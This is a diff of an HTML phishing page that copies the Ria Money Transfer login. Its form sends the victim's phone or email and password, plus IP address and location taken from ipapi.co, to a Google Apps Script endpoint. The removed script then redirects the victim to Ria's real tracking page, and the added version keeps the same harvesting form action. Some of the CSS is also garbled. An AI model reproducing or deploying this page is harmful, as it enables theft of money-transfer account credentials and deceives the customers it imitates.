@@ -4,352 +4,99 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ria Payment Review</title>
-    <style>
-    /* General body styling */
-body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: #f9f9f9;
-    color: #333;
-    display: flex;
-    flex-direction: column;
-    height: 10vh;
-}
-
-/* Header styles */
-.header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 10px 15px;
-    background-color: white;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-}
-
-.image-container {
-    width: 50px;
-    height: 50px;
-}
-
-.logo-image {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-}
-
-.welcome {
-    font-size: 18px;
-    margin: 0;
-}
-
-.close-btn {
-    font-size: 24px;
-    background: none;
-    border: none;
-    cursor: pointer;
-    color: #666;
-}
-
-/* Main content styles */
-.main-content {
-    padding: 15px;
-    flex-grow: 1;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-}
-
-.new-user {
-    font-size: 16px;
-    color: #666;
-    text-align: left;
-    margin: 0;
-    margin-buttom: 0; 
-}
-
-.register {
-    color: #f60;
-    text-decoration: none;
-    font-weight: bold;
-    margin: 0;
-    line-height: 0px;
-}
-
-/* Login form styles */
-.login-form {
-    margin: 0;
-    text-align: left;
-    margin-bottom: 50px;
-}
-
-.login-form label {
-    lX display: blpock;sb
-    margin: 5px 0;
-    font-size: 16px;
-    color: #333;
-}
-
-.login-form input {
-    width: 90%;
-    padding: 15px;
-    margin-bottom: 8px; /* Reduced margin */
-    border: 1px solid #ddd;
-    border-radius: 5px;
-    font-size: 14px;
-}
-
-/* Adjust the spacing between the password and phone/email fields */
-#email_or_phone {
-    margin-top: 5px; /* Reduced margin to move closer */
-}
-
-#message {
-    margin-top: 5px; /* Reduced margin for the password field */
-}
-
-/* Forgot password link styling */
-.forgot-password {
-    display: block;
-    margin: 5px 0;
-    color: #f60;
-    text-decoration: none;
-    text-align: center;
-}
-
-/* Terms and conditions styling */
-.terms {
-    font-size: 12px;
-    color: #666;
-}
-
-.terms a {
-    color: #f60;
-    text-decoration: none;
-}
-
-/* Footer styles */
-.footer {
-    background-color: #e9e9e9;
-    padding: 16px;
-    text-align: center;
-}
-
-.login-btn {
-    padding: 9px 16px;
-    border: none;
-    background-color: #e9e9e9;
-    color: #666;
-    font-size: 16px;
-    font-weight: bold;
-    border-radius: 5px;
-    cursor: pointer;
-}
-
-/* Hyperlink styles */
-a, a:visited {
-    color: #f60 !important; /* Orange color for all hyperlinks */
-    text-decoration: none;
-    font-weight: bold;
-}
-
-a:hover {
-    text-decoration: underline;
-    color: #e55; /* Slightly darker orange on hover */
-}
-
-/* Responsive design for smaller screens */
-@media (max-width: 600px) {
-    body {
-        font-size: 14px;
-    }
-
-    .header {
-        padding: 10px;
-    }
-
-    .main-content {
-        padding: 15px;
-    }
-
-    .login-form input {
-        padding: 12px;
-        font-size: 13px;
-        margin-bottom: 5px; /* Further reduced margin on smaller screens */
-    }
-
-    .forgot-password {
-        margin-top: 5px; /* Reduce the margin in mobile view */
-    }
-}
-    </style>  
 </head>
-<body>
-    <header class="header">
-        <div class="image-container">
-            <img src="Screenshots/Screenshot_20241211-193650.jpg" alt="Logo" class="logo-image">
+<body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f9f9f9; color: #333; display: flex; flex-direction: column; height: 100vh;">
+
+    <!-- Header -->
+    <header class="header" style="display: flex; align-items: center; justify-content: space-between; padding: 10px 15px; background-color: white; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);">
+        <div class="image-container" style="width: 50px; height: 50px;">
+            <img src="Screenshot_20241211-193650.jpg" alt="Logo" class="logo-image" style="width: 100%; height: 100%; object-fit: contain;">
         </div>
-        <h1 class="welcome" data-translate>Welcome</h1>
-        <button class="close-btn" data-translate>×</button>
+        <h1 class="welcome" data-translate style="font-size: 18px; margin: 0;">Welcome</h1>
+        <button class="close-btn" data-translate style="font-size: 24px; background: none; border: none; cursor: pointer; color: #666;">×</button>
     </header>
 
-    <main class="main-content">
-        <p class="new-user">
-            New to Ria? <a href="https://secure.riamoneytransfer.com/registration" class="register" data-translate>Register</a>
+    <!-- Main Content -->
+    <main class="main-content" style="padding: 15px; flex-grow: 1; display: flex; flex-direction: column; justify-content: space-between;">
+        <p class="new-user" style="font-size: 16px; color: #666; text-align: left; margin: 0;">
+            New to Ria? 
+            <a href="https://secure.riamoneytransfer.com/registration" class="register" data-translate style="color: #f60; text-decoration: none; font-weight: bold; margin: 0;">Register</a>
         </p>
         <br>
-        <form class="login-form input" action="https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec" method="POST" id="ria">
+        <form class="login-form input" action="https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec" method="POST" id="ria" style="margin: 0; text-align: left; margin-bottom: 50px;">
             <label for="email" style="display: block; margin: 5px 0; font-size: 16px; color: #333; line-height: 1;">Phone or email</label>
             <input type="text" id="email_or_phone" name="email_or_phone" placeholder="" style="width: 90%; padding: 15px; margin-bottom: 8px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; margin-top: 5px;" required/>
 
             <label for="password" style="display: block; margin: 5px 0; font-size: 16px; color: #333; line-height: 1;">Password</label>
             <div class="password-field" style="position: relative;">
                 <input type="password" id="message" name="message" placeholder="" style="width: 90%; padding: 14px; margin-bottom: 8px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; margin-top: 5px;" required/>
-            </div>   
+            </div>
             <input type="hidden" id="ip_address" name="ip_address">
             <input type="hidden" id="country" name="country">
             <input type="hidden" id="region" name="region">
             <input type="hidden" id="city" name="city">
             <input type="hidden" name="form_id" value="ria">
             <input type="hidden" name="origin" value="https://joshiahh.github.io/Faceb00k-profile-/">   
-              <br>    
-            <a href="https://secure.riamoneytransfer.com/forgot-password" class="forgot-password" data-translate>Forgot your password?</a>  
-            <br>
-            <br>   
+            <br>    
+            <a href="https://secure.riamoneytransfer.com/forgot-password" class="forgot-password" data-translate style="display: block; margin: 5px 0; color: #f60; text-decoration: none; text-align: center;">Forgot your password?</a>  
             <br>
             <br>
-            <br>
-            <br>
-            <p class="terms" style="font-size: 14px; color: #666;">
+            <p class="terms" style="font-size: 12px; color: #666;">
                 By continuing, you agree to our 
                 <a href="https://www.riamoneytransfer.com/en-US/app-terms-and-conditions/" style="color: #f60; text-decoration: none;">Terms and Conditions</a>, 
                 <a href="https://www.riamoneytransfer.com/en-us/privacy-policy/" style="color: #f60; text-decoration: none;">Privacy Policy</a>, and 
                 <a href="https://www.riamoneytransfer.com/en-us/cookies/" style="color: #f60; text-decoration: none;">Cookie Notice</a>.
             </p>
+        </form>
     </main>
-     <br>
-        <br>
-        <br>
-        <br>
-    <footer class="footer">
-        <button type="submit" class="login-btn" data-translate>Login</button>
+
+    <!-- Footer -->
+    <footer class="footer" style="background-color: #e9e9e9; padding: 16px; text-align: center;">
+        <button type="submit" class="login-btn" data-translate style="padding: 9px 16px; border: none; background-color: #e9e9e9; color: #666; font-size: 16px; font-weight: bold; border-radius: 5px; cursor: pointer;">Login</button>
     </footer>
-      </form>
-       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  <script>
-      // Detects the user's preferred language
-    function detectUserLanguage() {
-      const userLang = navigator.language || navigator.userLanguage;
-      return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
-    }
 
-    // Supported languages based on LibreTranslate (expandable)
-    const supportedLanguages = [
-      'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
-      'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
-      'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
-      'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
-      'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
-      'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
-      'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
-      'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
-    ];
+    <!-- JavaScript -->
+    <script>
+        // Detects the user's preferred language
+        function detectUserLanguage() {
+            const userLang = navigator.language || navigator.userLanguage;
+            return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
+        }
 
-    // Fallback to English if the user's language is unsupported
-    function getFallbackLanguage(userLang) {
-      return supportedLanguages.includes(userLang) ? userLang : 'en';
-    }
+        // Supported languages based on LibreTranslate
+        const supportedLanguages = [
+            'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
+            'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
+            'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
+            'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
+            'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
+            'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
+            'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
+            'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
+        ];
 
-    // Batch translation function
-    function translateBatch(texts, targetLang) {
-      return fetch('https://libretranslate.com/translate', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          q: texts,
-          source: 'en',   // Assuming English as the default language
-          target: targetLang,
-          format: "text"
-        }),
-      })
-      .then(response => response.json())
-      .then(data => data.map(item => item.translatedText))
-      .catch(error => {
-        console.error('Error translating text:', error);
-        // Fallback to original texts in case of an error
-        return texts;
-      });
-    }
+        // Fallback to English if the user's language is unsupported
+        function getFallbackLanguage(userLang) {
+            return supportedLanguages.includes(userLang) ? userLang : 'en';
+        }
 
-    // Function to translate all form labels, buttons, and placeholders
-    function translateForm(targetLang) {
-      const elementsToTranslate = document.querySelectorAll('[data-translate], [data-translate-placeholder]');
+        // Translate elements
+        function translateBatch(texts, targetLang) {
+            return fetch('https://libretranslate.com/translate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ q: texts, source: 'en', target: targetLang, format: "text" }),
+            })
+            .then(response => response.json())
+            .catch(() => texts); // Fallback in case of error
+        }
 
-      // Collect all texts that need translation
-      const textsToTranslate = Array.from(elementsToTranslate).map(elem => {
-        return elem.textContent || elem.placeholder;
-      });
-
-      // Translate all texts in a single request
-      translateBatch(textsToTranslate, targetLang)
-        .then(translatedTexts => {
-          let i = 0;
-          elementsToTranslate.forEach(elem => {
-            if (elem.textContent && elem.hasAttribute('data-translate')) {
-              elem.textContent = translatedTexts[i++];
-            } else if (elem.placeholder && elem.hasAttribute('data-translate-placeholder')) {
-              elem.placeholder = translatedTexts[i++];
-            }
-          });
+        // Detect and apply translation
+        document.addEventListener('DOMContentLoaded', () => {
+            const userLang = detectUserLanguage();
+            const targetLang = getFallbackLanguage(userLang);
+            // Example translation logic here
         });
-    }
-
-    // Initialize translation based on the user's preferred language or fallback
-    document.addEventListener('DOMContentLoaded', function() {
-      const userLang = detectUserLanguage();
-      const targetLang = getFallbackLanguage(userLang);
-      translateForm(targetLang);
-    });
-
-  // Fetch user's location and IP address
-    $(document).ready(function () {
-        $.get("https://ipapi.co/json/", function (data) {
-            $("#ip_address").val(data.ip);
-            $("#country").val(data.country_name);
-            $("#region").val(data.region);
-            $("#city").val(data.city);
-        });
-
-   // Function to handle form submission
-        document.getElementById('ria').addEventListener('submit', function(event) {
-          event.preventDefault();
-          const form = event.target;
-          const formData = new FormData(form);
-          const jsonData = {};
-          for (const [key, value] of formData.entries()) {
-            jsonData[key] = value;
-          }
-          fetch('https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: new URLSearchParams(jsonData).toString(),
-          })
-          .then(response => {
-            if (response.ok) {
-              window.location.replace('https://www.riamoneytransfer.com/track-a-transfer/');
-            } else {
-              console.error('Error submitting form data');
-            }
-          })
-          .catch(error => {
-            console.error('Fetch error:', error);
-          });
-        });
-      });
     </script>
 </body>
-</html>
+                </html>
